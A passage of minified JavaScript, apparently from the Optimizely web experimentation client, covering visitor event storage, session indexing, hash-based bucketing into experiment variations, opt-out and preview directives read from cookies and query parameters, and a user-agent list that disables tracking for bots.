            e = "number" != typeof e ? u - 36e5 : e, r = "number" != typeof r ? 0 : r, c = "number" != typeof c ? e : c, s(n = new i(new a("", ""), e, c, r), t, !1);
          } else t.setFieldValue(o.FIELDS.SESSION_INDEX, 0);
        }, t.sessionize = function (n) {
          var e = n.length;
          if (0 !== e) {
            n[0].setFieldValue(o.FIELDS.SESSION_ID, n[0].getValueOrDefault([o.FIELDS.TIME]));
            for (var i = 1; i < e; i++) c(n[i - 1], n[i]);
            var a = t.CURRENT_SESSION_INDEX,
              f = n[e - 1].getValueOrDefault([o.FIELDS.TIME]);
            r.now() - f > u && (a += 1), n[e - 1].setFieldValue(o.FIELDS.SESSION_INDEX, a);
            for (i = e - 1; i > 0; i--) s(n[i], n[i - 1], !0);
          }
        }, t.reindexIfNecessary = function (n, t, e) {
          var i = function (n) {
            for (var t = 0; t < n.length; t++) {
              var e = n[t].getValueOrDefault([o.FIELDS.SESSION_INDEX]);
              n[t].setFieldValue(o.FIELDS.SESSION_INDEX, e + 1);
            }
          };
          -1 === n.getValueOrDefault([o.FIELDS.SESSION_INDEX]) && (i(t), i(e));
        }, t.sessionSortPredicate = function (n, t) {
          return n[o.FIELDS.TIME] - t[o.FIELDS.TIME];
        }, t.applyMigrations = function (n) {
          return !1;
        };
      },
      9314: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3792),
          a = e(1852),
          u = e(4797),
          c = e(2678),
          s = e(1685),
          f = t,
          l = e(5093).j,
          d = e(2657),
          v = e(5093).x,
          h = e(2289),
          p = e(4041),
          g = p.get("stores/visitor_events"),
          m = p.get("stores/visitor_events_manager"),
          _ = {
            EVENTBASE: "eb",
            HASH: "h",
            TIMEBASE: "tb",
            TIMESTAMPS: "ts",
            DELTA: "d",
            INDEX: "i"
          };
        function w(n) {
          u.dispatch(r.SET_VISITOR_EVENTS, n);
        }
        function y(n) {
          u.dispatch(r.UPDATE_BEHAVIOR_STORE, {
            key: "baseMap",
            value: n
          });
        }
        function b(n) {
          u.dispatch(r.UPDATE_BEHAVIOR_STORE, {
            key: "eventQueue",
            value: n
          });
        }
        function E(n) {
          u.dispatch(r.UPDATE_BEHAVIOR_STORE, {
            key: "lastEvent",
            value: n
          });
        }
        function I() {
          return g.getEvents();
        }
        function A() {
          return m.getBaseMap();
        }
        function T() {
          return m.getEventQueue();
        }
        function S() {
          return m.getLastEvent();
        }
        function k() {
          var n = I().concat(T()),
            t = !1;
          return n.length > 1e3 && (n = n.slice(-1e3), t = !0), w(n), b([]), t;
        }
        t.initialize = function (n, t) {
          if (!m.getInitialized()) {
            f.S(n, t);
            var e = I();
            e.length > 0 && E(e[e.length - 1]);
            var i = T();
            i.length > 0 && E(i[i.length - 1]), u.dispatch(r.UPDATE_BEHAVIOR_STORE, {
              key: "initialized",
              value: !0
            });
          }
        }, t.addEvent = function (n) {
          c.debug("Behavior store: adding event", n);
          var t = f.k(n);
          E(t), b(T().concat(t)), h.reindexIfNecessary(S(), I(), T()), f.R(T());
        }, t.getEvents = function () {
          return T().length > 0 && (k() && h.sessionize(I()), f.N(I()), f.R(T())), I();
        }, t.getEventCount = function () {
          return T().length + I().length;
        }, f.S = function (n, t) {
          f.D(n, t) && (f.N(I()), f.R(T())), h.sessionize(I());
        }, f.D = function (n, t) {
          if (0 === n.length && 0 === t.length) return w([]), b([]), !1;
          var e = !1,
            i = n[0] || t[0];
          return _.EVENTBASE in i ? (w(f.C(n)), b(f.C(t))) : (e = !0, w(f.O(n)), b(f.O(t))), T().length > 0 && (k(), e = !0), w(f._updateBaseMapAndMaybeDedupe(I())), f._migrateEventBasesAndUpdateStore() && (e = !0), e;
        }, f.O = function (n) {
          for (var t = [], e = 0; e < n.length; e++) {
            var i = n[e],
              r = f.P(i);
            t[e] = new l(r, i[d.FIELDS.TIME]);
          }
          return t;
        }, f._migrateEventBasesAndUpdateStore = function () {
          var n = !1,
            t = f.M();
          return h.applyMigrations(t) && (n = !0, y({}), w(f._updateBaseMapAndMaybeDedupe(I())), b(f._updateBaseMapAndMaybeDedupe(T()))), n;
        }, f.L = function () {
          return o.now();
        }, f.k = function (n) {
          var t,
            e = n.name,
            i = n.type || "default",
            r = n.category || a.OTHER,
            o = n.tags || {};
          n.revenue && (t = n.revenue);
          var u = new v(e, i, r, o, t);
          u = f.V(u);
          var c = f.L(),
            s = new l(u, c, -1);
          return h.updateSessionId(S(), s), h.updateSessionIndex(S(), s), s;
        }, f._updateBaseMapAndMaybeDedupe = function (n) {
          for (var t = 0; t < n.length; t++) n[t].eventBase = f.V(n[t].eventBase);
          return n;
        }, f.N = function (n) {
          var t = f.F(n);
          s.persistBehaviorEvents(t);
        }, f.R = function (n) {
          var t = f.F(n);
          s.persistBehaviorEventQueue(t);
        }, f.B = function () {
          var n;
          m.getCleared() || (w([]), b([]), f.N(I()), f.R(T()), y({}), E(null), n = !0, u.dispatch(r.UPDATE_BEHAVIOR_STORE, {
            key: "cleared",
            value: n
          }));
        }, f.V = function (n) {
          var t = n.hash(),
            e = A(),
            r = e[t];
          if (i.isUndefined(r)) return e[t] = [n], y(e), n;
          for (var o = 0; o < r.length; o++) if (n.equals(r[o])) return r[o];
          return r.push(n), y(e), n;
        }, f.M = function () {
          var n = [],
            t = A();
          for (var e in t) !t.hasOwnProperty(e) || (n = n.concat(t[e]));
          return n;
        }, f.F = function (n) {
          for (var t = function (n) {
              var t = {};
              t[d.FIELDS.NAME] = n.getValueOrDefault([d.FIELDS.NAME]), t[d.FIELDS.TYPE] = n.getValueOrDefault([d.FIELDS.TYPE]);
              var e = n.getValueOrDefault([d.FIELDS.CATEGORY]);
              i.isUndefined(e) || (t[d.FIELDS.CATEGORY] = e);
              var r = n.getValueOrDefault([d.FIELDS.REVENUE]);
              i.isUndefined(r) || (t[d.FIELDS.REVENUE] = r);
              var o = n.getValueOrDefault([d.FIELDS.OPTIONS]);
              return i.isUndefined(o) || (t[d.FIELDS.OPTIONS] = o), t;
            }, e = _, r = [], o = "_idx_", a = 0; a < n.length; a++) {
            var u,
              c,
              s = n[a],
              f = s.eventBase;
            if (f.hasOwnProperty(o)) {
              u = r[f._idx_];
              var l = s[d.FIELDS.TIME] - (u[e.TIMEBASE] || 0);
              (c = {})[e.DELTA] = l, c[e.INDEX] = a, u[e.TIMESTAMPS].push(c);
            } else (u = {})[e.EVENTBASE] = t(s), u[e.HASH] = f.hash(), u[e.TIMEBASE] = s[d.FIELDS.TIME], (c = {})[e.DELTA] = 0, c[e.INDEX] = a, u[e.TIMESTAMPS] = [c], r.push(u), f._idx_ = r.length - 1;
          }
          for (a = 0; a < n.length; a++) delete n[a].eventBase._idx_;
          return r;
        }, f.P = function (n, t) {
          var e = new v(n[d.FIELDS.NAME], n[d.FIELDS.TYPE], n[d.FIELDS.CATEGORY], n[d.FIELDS.OPTIONS], n[d.FIELDS.REVENUE]);
          return i.isUndefined(t) || e.setHash(t), e;
        }, f.C = function (n) {
          for (var t = _, e = [], i = 0; i < n.length; i++) for (var r = n[i], o = f.P(r[t.EVENTBASE], r[t.HASH]), a = r[t.TIMEBASE], u = r[t.TIMESTAMPS], c = 0; c < u.length; c++) {
            var s = u[c],
              d = new l(o, a + s[t.DELTA]);
            e[s[t.INDEX]] = d;
          }
          return e;
        }, t.deserialize = function (n) {
          return f.C(n);
        }, t.mergeAllEvents = function (n) {
          var t = [].concat.apply([], n);
          return t.sort(h.sessionSortPredicate), h.sessionize(t), t;
        };
      },
      2805: function (n, t, e) {
        var i = e(2624);
        n.exports = i({
          LOG: null,
          SET_LOGLEVEL: null,
          INITIALIZE_STATE: null,
          SET_DOMCONTENTLOADED: null,
          ACTIVATE: null,
          UPDATE_BEHAVIOR_STORE: null,
          DATA_LOADED: null,
          SET_CLIENT_NAME: null,
          SET_CLIENT_VERSION: null,
          LOAD_PERSISTED_LAYER_STATES: null,
          RECORD_GLOBAL_DECISION: null,
          RECORD_LAYER_DECISION: null,
          ENSURE_ORIGINAL_PUSHSTATE: null,
          ENSURE_ORIGINAL_REPLACESTATE: null,
          SET_VISITOR_ATTRIBUTES: null,
          SET_VISITOR_ATTRIBUTE_PENDING: null,
          LOAD_EXISTING_VISITOR_PROFILE: null,
          SET_VISITOR_EVENTS: null,
          SET_FOREIGN_VISITOR_EVENTS: null,
          SET_FOREIGN_VISITOR_EVENT_QUEUE: null,
          SET_VISITOR_ID: null,
          SET_VISITOR_ID_VIA_API: null,
          REFRESH_SESSION: null,
          LOAD_SESSION_STATE: null,
          UPDATE_VARIATION_ID_MAP: null,
          MERGE_VARIATION_ID_MAP: null,
          UPDATE_PREFERRED_LAYER_MAP: null,
          MERGE_PREFERRED_LAYER_MAP: null,
          RECORD_LAYER_DECISION_EVENT_ID: null,
          TRACK_VIEW_ACTIVATED_EVENT: null,
          REGISTER_ASYNC_DEFERRED: null,
          RESOLVE_DEFERRED: null,
          REJECT_DEFERRED: null,
          REGISTER_PLUGIN: null,
          ADD_CLEANUP_FN: null,
          CLEAR_CLEANUP_FN: null,
          ACTION_EXECUTED: null,
          REGISTER_ACTION: null,
          SET_VIEW_ACTIVE_STATE: null,
          UPDATE_PARSED_VIEW_METADATA: null,
          UPDATE_USER_SUPPLIED_METADATA: null,
          REGISTER_VIEWS: null,
          SET_GLOBAL_TAGS: null,
          SET_VIEW_BATCHING: null,
          RESET_VIEW_STATES: null,
          ATTACH_EVENT_STREAM_PUBLISHERS: null,
          DETACH_EVENT_STREAM_PUBLISHERS: null,
          LOAD_DIRECTIVE: null,
          SET_COOKIE_AGE: null,
          SET_COOKIE_DOMAIN: null,
          SET_COOKIE_AUTO_REFRESH: null,
          XDOMAIN_SET_DEFAULT_FRAME: null,
          XDOMAIN_ADD_FRAME: null,
          XDOMAIN_SET_MESSAGE: null,
          XDOMAIN_ADD_SUBSCRIBER: null,
          XDOMAIN_SET_CANONICAL_ORIGINS: null,
          XDOMAIN_SET_DISABLED: null,
          ADD_EMITTER_HANDLER: null,
          REMOVE_EMITTER_HANDLER: null,
          SET_INTEGRATION_SETTINGS: null,
          ADD_CHANGE: null,
          SET_CHANGE_APPLIER: null,
          REMOVE_ACTION_STATE: null,
          ANNOUNCE_PENDING_REDIRECT: null,
          LOAD_REDIRECT_DATA: null,
          REGISTER_TRACKED_REDIRECT_DATA: null,
          SET_PENDING_EVENT: null,
          REMOVE_PENDING_EVENT: null,
          LOAD_PENDING_EVENTS: null,
          SANDBOXED_FUNCTIONS_ADDED: null,
          SET_RUM_DATA: null,
          RECORD_API_USAGE: null,
          INITIALIZE_CHANGE_METRICS: null,
          RECORD_ACTIVATION_TYPE_USAGE: null,
          RECORD_AUDIENCE_USAGE: null,
          RECORD_CHANGE_MACROTASK_RATE: null,
          RECORD_CHANGE_OVERHEATED: null,
          RECORD_CHANGE_TYPE_USAGE: null,
          RECORD_DOM_OBSERVATION_OCCURENCE: null,
          RECORD_INTEGRATION_USAGE: null,
          RECORD_LAYER_FEATURE_USAGE: null,
          RECORD_LAYER_POLICY_USAGE: null,
          RECORD_RECOMMENDATIONS_USAGE: null,
          RECORD_VIEW_FEATURE_USAGE: null,
          RECORD_VIEWS_INITIALLY_ACTIVATED_COUNT: null,
          RECORD_VISITOR_ID_LOCATOR_USAGE: null,
          RECORD_VISITOR_ID_ERROR: null,
          RECORD_STICKY_BUCKETING_FEATURE: null,
          SET_PERFORMANCE_MARKS_DATA: null,
          FINALIZE_BATCH_SNAPSHOT: null,
          REGISTER_PREVIOUS_BATCH: null,
          REGISTER_TRACKER_VISITOR: null,
          REGISTER_TRACKER_EVENT: null,
          REGISTER_TRACKER_DECISION: null,
          RESET_TRACKER_EVENTS: null,
          RESET_TRACKER_PREVIOUS_BATCHES: null,
          RESET_TRACKER_STORE: null,
          SET_TRACKER_POLLING: null,
          SET_TRACKER_BATCHING: null,
          SET_TRACKER_SEND_EVENTS: null,
          SET_TRACKER_PERSISTABLE_STATE: null,
          SET_TRACKER_DIRTY: null,
          UPDATE_TRACKER_VISITOR_ATTRIBUTES: null,
          SET_UA_DATA: null
        });
      },
      8964: function (n, t, e) {
        var i = e(9576),
          r = e(2624);
        t.COOKIES = {
          OPT_OUT: "optimizelyOptOut",
          PREVIEW: "optimizelyPreview",
          REDIRECT: "optimizelyRedirectData",
          SESSION_STATE: "optimizelySessionState",
          TOKEN: "optimizelyToken",
          VISITOR_ID: "optimizelyEndUserId",
          VISITOR_UUID: "optimizelyPPID"
        }, t.LayerActivationTypes = {
          CONDITIONAL: "conditional",
          IMMEDIATE: "immediate",
          MANUAL: "manual",
          READY: "ready",
          TIMEOUT: "timeout"
        }, t.LogLevel = {
          OFF: 0,
          ERROR: 1,
          WARN: 2,
          INFO: 3,
          DEBUG: 4
        }, t.Lifecycle = r({
          preActivate: null,
          postVisitorProfileLoad: null,
          postViewsActivated: null,
          postActivate: null
        }), t.ViewActivationTypes = {
          immediate: "immediate",
          manual: "manual",
          callback: "callback",
          polling: "polling",
          URLChanged: "url_changed",
          DOMChanged: "dom_changed"
        }, t.StorageKeys = {
          PENDING_EVENTS: "pending_events",
          RELAYED_EVENTS: "relayed_events"
        }, t.PluginTypes = r({
          visitorProfileProviders: null,
          viewProviders: null,
          audienceMatchers: null,
          viewMatchers: null,
          analyticsTrackers: null,
          viewTagLocators: null,
          userFeatureDefs: null,
          apiModules: null,
          changeAppliers: null,
          deciders: null,
          eventImplementations: null,
          viewTriggers: null
        }), t.ResourceTimingAttributes = r({
          connectStart: null,
          connectEnd: null,
          decodedBodySize: null,
          domainLookupStart: null,
          domainLookupEnd: null,
          duration: null,
          encodedBodySize: null,
          fetchStart: null,
          requestStart: null,
          responseStart: null,
          responseEnd: null,
          secureConnectionStart: null,
          startTime: null,
          transferSize: null,
          serverTiming: null
        }), t.RUMPerformanceTimingAttributes = r({
          blockTime: null
        }), t.AttributionTypes = r({
          FIRST_TOUCH: null,
          LAST_TOUCH: null
        }), t.SandboxedFunctions = r({
          XMLHttpRequest: null
        }), t.PerformanceData = r({
          performance_marks: null,
          resource_timing: null,
          performance_timing: null
        }), t.PerformanceCounters = r({
          mutation_observer_invocation: null,
          polling_invocation: null,
          match_selector_invocation: null
        }), t.VisitorStorageKeys = {
          EVENTS: "events",
          EVENT_QUEUE: "event_queue",
          LAYER_MAP: "layer_map",
          LAYER_STATES: "layer_states",
          SESSION_STATE: "session_state",
          VISITOR_PROFILE: "visitor_profile",
          VARIATION_MAP: "variation_map",
          TRACKER_OPTIMIZELY: "tracker_optimizely"
        }, t.AllStorageKeys = i.assign({}, t.StorageKeys, t.VisitorStorageKeys), t.ListTargetingKeyTypes = {
          COOKIE: "c",
          QUERY: "q",
          JS_VARIABLE: "j"
        }, t.VisitorIdLocatorType = {
          COOKIE: "cookie",
          JS_VARIABLE: "js",
          LOCALSTORAGE: "localStorage",
          QUERY: "query"
        };
      },
      1852: function (n) {
        n.exports = {
          OTHER: "other"
        };
      },
      7356: function (n, t) {
        t.TYPES = {
          ACTION: "action",
          ANALYTICS: "analytics",
          EDITOR: "editor",
          LIFECYCLE: "lifecycle"
        };
      },
      1372: function (n) {
        n.exports = {
          CLICK: "click",
          CUSTOM: "custom",
          ENGAGEMENT: "engagement",
          PAGEVIEW: "pageview"
        };
      },
      9612: function (n, t, e) {
        var i = e(2624);
        t.TrackLayerDecisionTimingFlags = i({
          preRedirectPolicy: null,
          postRedirectPolicy: null,
          nonRedirectPolicy: null
        }), t.PreRedirectPolicies = i({
          PERSIST_BEFORE_AND_TRACK_DURING_REDIRECT: null,
          PERSIST_BEFORE_REDIRECT: null
        }), t.PostRedirectPolicies = i({
          TRACK_IMMEDIATELY: null,
          TRACK_AFTER_SYNC: null
        }), t.NonRedirectPolicies = i({
          TRACK_IMMEDIATELY: null
        }), t.RedirectRelayMedia = i({
          COOKIE: null
        });
      },
      151: function (n, t, e) {
        var i = e(7751),
          r = t.TOTAL_POINTS = 1e4;
        t.bucketingNumber = function (n, t, e) {
          return i.hashToInt(n + t, e, r);
        }, t.isHoldback = function (n, e) {
          return t.bucketingNumber(n, e.id, i.Seed.IGNORING) < (e.holdback || 0);
        }, t.chooseWeightedCandidate = function (n, e, r) {
          for (var o = t.bucketingNumber(n, e, i.Seed.BUCKETING), a = 0; a < r.length; a++) if (r[a].endOfRange > o) return r[a].entityId;
          throw new Error("Unable to choose candidate");
        };
      },
      6183: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(151),
          a = e(6227),
          u = e(7065).E,
          c = e(4797),
          s = e(2678);
        t.isValidExperiment = function (n, t) {
          var e,
            r = i.partial(i.includes, n);
          return s.groupCollapsed("Decision / Evaluating audiences for experiment:", t, n), e = !t.audienceIds || a.evaluate(t.audienceIds, r), s.groupEnd(), s.debug("Decision / Experiment", t, "is valid?", e), e;
        }, t.selectVariation = function (n, t, e, a, f) {
          if (!n.variations || 0 === n.variations.length) throw new u('No variations in selected experiment "' + n.id + '"');
          if (!n.weightDistributions && n.variations.length > 1) throw new u('On selected experiment "' + n.id + '", weightDistributions must be defined if # variations > 1');
          var l;
          if (n.bucketingStrategy && "impression" === n.bucketingStrategy) {
            if (1 === n.variations.length) l = n.variations[0].id;else {
              var d = a;
              l = o.chooseWeightedCandidate(e + d, n.id, n.weightDistributions);
            }
          } else if (l = 1 === n.variations.length ? n.variations[0].id : o.chooseWeightedCandidate(e, n.id, n.weightDistributions), f && f[n.id]) {
            s.debug("Decision / Using preferredVariationMap to select variation for experiment:", n.id);
            var v = f[n.id];
            if (!i.find(n.variations, {
              id: v
            })) return c.dispatch(r.RECORD_STICKY_BUCKETING_FEATURE, {
              feature: "stoppedVariation",
              id: n.id
            }), s.debug("Decision / Preferred variation:", v, "not found on experiment:", n.id, ". Visitor not bucketed."), null;
            v !== l && (c.dispatch(r.RECORD_STICKY_BUCKETING_FEATURE, {
              feature: "preferredVariation",
              id: n.id
            }), l = v);
          }
          var h = i.find(n.variations, {
            id: l
          });
          if (h) return s.debug("Decision / Selected variation:", h), h;
          throw new u('Unable to find selected variation: "' + l + '".');
        }, t.getExperimentById = function (n, t) {
          var e = i.find(n.experiments, {
            id: t
          });
          if (e) return e;
          throw new u("Unable to find selected experiment.");
        }, t.hasVariationActionsOnView = function (n, t) {
          return s.debug("Decision / Checking variation:", n, "for actions on pageId:", t), !!i.find(n.actions, function (n) {
            return n.pageId === t && !i.isEmpty(n.changes);
          });
        };
      },
      7065: function (n, t) {
        function e(n) {
          this.message = n;
        }
        e.prototype = new Error(), t.E = e;
      },
      3378: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(7989),
          a = e(6621),
          u = e(151),
          c = e(6183),
          s = e(7065).E,
          f = e(4041),
          l = e(8964),
          d = e(4797),
          v = e(1722),
          h = e(4604),
          p = e(2678),
          g = e(2119),
          m = f.get("stores/plugins"),
          _ = f.get("stores/global"),
          w = f.get("stores/layer_data");
        function y(n) {
          var t = m.getPlugin(l.PluginTypes.deciders, n);
          if (i.isEmpty(t)) throw new Error("No deciders found for policy: " + n);
          return t;
        }
        t.isPageIdRelevant = function (n) {
          if (!n) return !1;
          var t = y(n.policy);
          return i.isFunction(t.includePageIdInDecisionTicket) ? t.includePageIdInDecisionTicket(n) : !0 === t.includePageIdInDecisionTicket;
        }, t.createTicket = function (n) {
          var t,
            e,
            r,
            o = i.pick(n, ["bucketingId", "globalHoldback", "preferredVariationMap", "pageId"]);
          return i.extend(o, {
            audienceIds: (t = n.visitorProfile, e = n.audiences, r = m.getAllPlugins(l.PluginTypes.audienceMatchers), i.reduce(e, function (n, e) {
              return a.isInAudience(t, e, r) && n.push(e.id), n;
            }, [])),
            activationId: _.getActivationId()
          }), o;
        }, t.decideGlobal = function (n) {
          return {
            isGlobalHoldback: u.isHoldback(n.bucketingId, {
              id: null,
              holdback: n.globalHoldback
            })
          };
        }, t.decideGroup = function (n, t) {
          p.debug("Decision / Deciding layer for group: ", v.description(n));
          var e,
            o,
            a = t.preferredLayerId,
            c = !!a;
          try {
            (e = u.chooseWeightedCandidate(t.bucketingId, n.id, n.weightDistributions)) && "None" !== e || (o = 'Group traffic allocation. Visitor maps to a "hole" in the bucket space left by an experiment or campaign that\'s since been removed from the group');
          } catch (l) {
            o = "Group traffic allocation. Visitor maps to a point in the bucket space which has never been covered by any experiment or campaign.";
          }
          if (c && (p.debug("Decision / Using preferredLayerMap to select layer for group:", v.description(n)), a !== e && (d.dispatch(r.RECORD_STICKY_BUCKETING_FEATURE, {
            feature: "preferredLayer",
            id: n.id
          }), e = a)), o) return {
            layerId: null,
            reason: o
          };
          if (!i.find(n.weightDistributions, {
            entityId: e
          })) {
            var f = "Visitor was" + (c ? " sticky-" : " non-sticky ") + "bucketed into a campaign (" + e + ") which is not in the group";
            if (!c) throw new s(f);
            return {
              layerId: null,
              reason: f
            };
          }
          return {
            layerId: e
          };
        }, t.decideLayer = function (n, t) {
          var e, r;
          p.debug("Deciding: ", n, t);
          var a,
            f,
            l = y(n.policy),
            d = {
              layerId: n.id,
              experimentId: null,
              variationId: null,
              isLayerHoldback: u.isHoldback(t.bucketingId, n)
            };
          if (i.isEmpty(n.experiments)) throw new s("No experiments in layer.");
          try {
            if (l.decideLayer) {
              p.debug("Decision / Using decider's custom decideLayer.");
              var v = l.decideLayer(n, t);
              e = v.experiment, r = v.variation;
            } else p.debug("Decision / Using default decideLayer behavior."), e = l.selectExperiment(n, t.audienceIds, t.bucketingId), r = c.selectVariation(e, t.audienceIds, t.bucketingId, t.activationId, t.preferredVariationMap);
          } catch (h) {
            a = h, (null != (f = s) && "undefined" != typeof Symbol && f[Symbol.hasInstance] ? f[Symbol.hasInstance](a) : a instanceof f) ? d.reason = h.message : d.error = h;
          }
          return d.experimentId = e ? e.id : null, d.variationId = r ? r.id : null, d.error && (d.error.name = "DecisionEngineError", o.emitError(d.error)), d;
        }, t.getDummyLayerDecision = function (n, t) {
          var e,
            i = function (n, t) {
              for (var e = 0; e < n.experiments.length; e++) for (var i = 0; i < n.experiments[e].variations.length; i++) if (t.indexOf(n.experiments[e].variations[i].id) > -1) return {
                experimentId: n.experiments[e].id,
                variationId: n.experiments[e].variations[i].id
              };
              return null;
            }(n, t);
          return i ? (p.log("Decision / Applying force variation:", i.variationId, "to Campaign", h.description(n)), e = {
            layerId: n.id,
            variationId: i.variationId,
            experimentId: i.experimentId,
            isLayerHoldback: !1,
            reason: "force"
          }) : (p.log("No variation matches ids:", t, "in Campaign", h.description(n)), e = {
            layerId: n.id,
            variationId: null,
            experimentId: null,
            isLayerHoldback: !1,
            reason: "force"
          }), e;
        }, t.isInCohort = function (n) {
          if (!n.experimentId || !n.variationId) return !1;
          var t = w.get(n.layerId);
          return !(g.isSingleExperimentPolicy(t.policy) && n.isLayerHoldback);
        };
      },
      4041: function (n, t, e) {
        var i = e(9576),
          r = e(5179),
          o = e(4797),
          a = e(1361),
          u = r.create(),
          c = {
            action_data: e(2034),
            async_request: e(3685),
            audience_data: e(6330),
            change_data: e(5065),
            cleanup: e(1390),
            client_metadata: e(3642),
            cookie_options: e(9381),
            event_data: e(9610),
            event_emitter: e(1592),
            dimension_data: e(4253),
            directive: e(4710),
            global: e(1312),
            history: e(6662),
            integration_settings: e(9935),
            layer: e(1037),
            layer_data: e(8336),
            log: e(8842),
            observed_redirect: e(8648),
            pending_events: e(9990),
            performance: e(1053),
            plugins: e(4808),
            provider_status: e(6743),
            pending_redirect: e(9441),
            rum: e(1349),
            sandbox: e(8654),
            session: e(2043),
            tracker_optimizely: e(3697),
            ua_data: e(2604),
            view: e(6963),
            view_data: e(1522),
            visitor: e(9984),
            visitor_attribute_entity: e(4375),
            visitor_events: e(5847),
            visitor_events_manager: e(9721),
            visitor_id: e(7022),
            visitor_bucketing: e(1217),
            xdomain: e(5417)
          };
        c.group_data = e(3881), o.registerStores(c), i.forOwn(c, function (n, t) {
          u.register("stores/" + t, o.getStore(t));
        }), u.register("core/plugins/matchers/key_value", a), n.exports = u;
      },
      4819: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(7989),
          a = e(8718),
          u = e(6639).U,
          c = e(8964),
          s = e(4797),
          f = e(2678),
          l = t.JSONParseError = u("JSONParseError"),
          d = e(4005),
          v = e(2676),
          h = e(2188),
          p = "optimizely_show_preview",
          g = "optimizely_disable",
          m = "optimizely_editor",
          _ = "optimizely_p13n",
          w = "optimizely_x_audiences",
          y = "optimizely_x",
          b = "optimizely_show_preview",
          E = "optimizely_opt_out",
          I = "optimizely_token",
          A = "optimizely_force_tracking";
        t.populateDirectiveData = function () {
          var n, t, e, u, T, S, k, R;
          !function () {
            var n = "OFF",
              t = d.getQueryParamValue("optimizely_log");
            if (t) {
              var e = t.split(":");
              "" !== e[0] && (n = String(e[0]).toUpperCase()), void 0 !== e[1] && f.setLogMatch(e[1]);
            }
            f.setLogLevel(n);
          }(), function () {
            var n = h.getUserAgent() || "";
            if (!i.isString(n)) return void f.warn("Directive / userAgent not a string");
            n = n.toLowerCase();
            var t = ["googlebot", "yahoo! slurp", "bingbot", "bingpreview", "msnbot", "keynote", "ktxn", "khte", "gomezagent", "alertsite", "yottaamonitor", "pingdom.com_bot", "aihitbot", "baiduspider", "adsbot-google", "mediapartners-google", "applebot", "catchpoint", "phantomjs", "moatbot", "facebookexternalhit"],
              e = function (t) {
                if (i.includes(n, t)) return f.warn("Directive / Matches bot:", t), !0;
              };
            i.some(t, e) && (f.log("Directive / Disabling tracking"), s.dispatch(r.LOAD_DIRECTIVE, {
              trackingDisabled: !0
            }));
          }(), n = Boolean(i.result(window.optimizely, "initialized")), s.dispatch(r.LOAD_DIRECTIVE, {
            alreadyInitialized: n
          }), s.dispatch(r.LOAD_DIRECTIVE, {
            mutationObserverAPISupported: h.isMutationObserverAPISupported()
          }), function () {
            var n = a.get(c.COOKIES.OPT_OUT),
              t = d.getQueryParamValue(E),
              e = "You have successfully opted out of Optimizely for this domain.",
              i = "You are NOT opted out of Optimizely for this domain.";
            if ("true" === t || "false" === t) {
              var o = "true" === t;
              s.dispatch(r.LOAD_DIRECTIVE, {
                shouldOptOut: o
              }), h.alert(o ? e : i);
            } else n && s.dispatch(r.LOAD_DIRECTIVE, {
              shouldOptOut: "true" === n
            });
          }(), function () {
            var n = !1,
              t = [p, g];
            t.push(m);
            for (var e = 0; e < t.length; e++) if ("true" === d.getQueryParamValue(t[e])) {
              f.warn("Directive / Not activating because " + t[e] + " is set."), n = !0;
              break;
            }
            s.dispatch(r.LOAD_DIRECTIVE, {
              disabled: n
            });
          }(), s.dispatch(r.LOAD_DIRECTIVE, {
            isEditor: !1
          }), s.dispatch(r.LOAD_DIRECTIVE, {
            isPreview: !1
          }), (t = d.getQueryParamValue(b)) && f.log("Directive / Is legacy preview mode"), s.dispatch(r.LOAD_DIRECTIVE, {
            isLegacyPreview: !!t
          }), s.dispatch(r.LOAD_DIRECTIVE, {
            isSlave: !1
          }), e = h.getGlobal("optlyDesktop"), (u = !(!e || i.isUndefined(e.p13nInner))) && f.log("Directive / Is running in desktop app editor"), s.dispatch(r.LOAD_DIRECTIVE, {
            isRunningInDesktopApp: u
          }), (T = "true" === d.getQueryParamValue(_)) && f.log("Directive / Is running in editor"), s.dispatch(r.LOAD_DIRECTIVE, {
            isRunningInV2Editor: T
          }), S = a.get(c.COOKIES.TOKEN) || null, k = d.getQueryParamValue(I) || S, s.dispatch(r.LOAD_DIRECTIVE, {
            projectToken: k
          }), function () {
            var n = a.get(c.COOKIES.PREVIEW),
              t = [],
              e = d.getQueryParamValue(w);
            if (e) t = a.safeDecodeURIComponent(e).split(",");else if (n) try {
              t = v.parse(n).forceAudienceIds;
            } catch (h) {
              var i = new l("Failed to parse previewCookie in registerForceAudienceIds: " + n),
                u = {
                  originalMessage: h.message,
                  userError: !0
                };
              o.emitError(i, u);
            }
            t.length && (f.log("Directive / Force Audience IDs:", t), s.dispatch(r.LOAD_DIRECTIVE, {
              forceAudienceIds: t
            }));
          }(), function () {
            var n = a.get(c.COOKIES.PREVIEW),
              t = [],
              e = d.getQueryParamValue(y);
            if (e) t = a.safeDecodeURIComponent(e).split(",");else if (n) try {
              t = v.parse(n).forceVariationIds;
            } catch (h) {
              var i = new l("Failed to parse previewCookie in registerForceVariationIds: " + n),
                u = {
                  originalMessage: h.message,
                  userError: !0
                };
              o.emitError(i, u);
            }
            t.length && (f.log("Directive / Force Variation IDs:", t), s.dispatch(r.LOAD_DIRECTIVE, {
              forceVariationIds: t
            }));
          }(), (R = d.getQueryParamValue(A)) && s.dispatch(r.LOAD_DIRECTIVE, {
            forceTracking: R
          });
        };
        t.setOptOut = function (n) {
          n ? (f.warn("Directive / Opting out"), a.set(c.COOKIES.OPT_OUT, "true", {
            maxAge: 31536e4
          }, !0)) : a.remove(c.COOKIES.OPT_OUT), s.dispatch(r.LOAD_DIRECTIVE, {
            shouldOptOut: n
          });
        };
      },
      3792: function (n, t) {
        t.now = function () {
          return +new Date();
        };
      },
      5172: function (n, t) {
        t.VERSION = "0.188.1", t.NAME = "js";
      },
      6954: function (n, t, e) {
        var i = e(4041).get("stores/global");
        e(5133);
        t.getDocumentElement = function () {
          return document.documentElement;
        }, t.getCookieString = function () {
          return document.cookie || "";
        }, t.setCookie = function (n) {
          document.cookie = n;
        }, t.querySelector = function (n) {
          return document.querySelector(n);
        }, t.querySelectorAll = function (n) {
          return document.querySelectorAll(n);
        }, t.parseUri = function (n) {
          var e = t.createElement("a");
          return e.href = n, e;
        }, t.childrenOf = function (n) {
          return Array.prototype.slice.call(n.querySelectorAll("*"));
        }, t.createElement = function (n) {
          return document.createElement(n);
        }, t.isReady = function () {
          return i.domContentLoadedHasFired() || "interactive" === document.readyState || "complete" === document.readyState;
        }, t.isLoaded = function () {
          return "complete" === document.readyState;
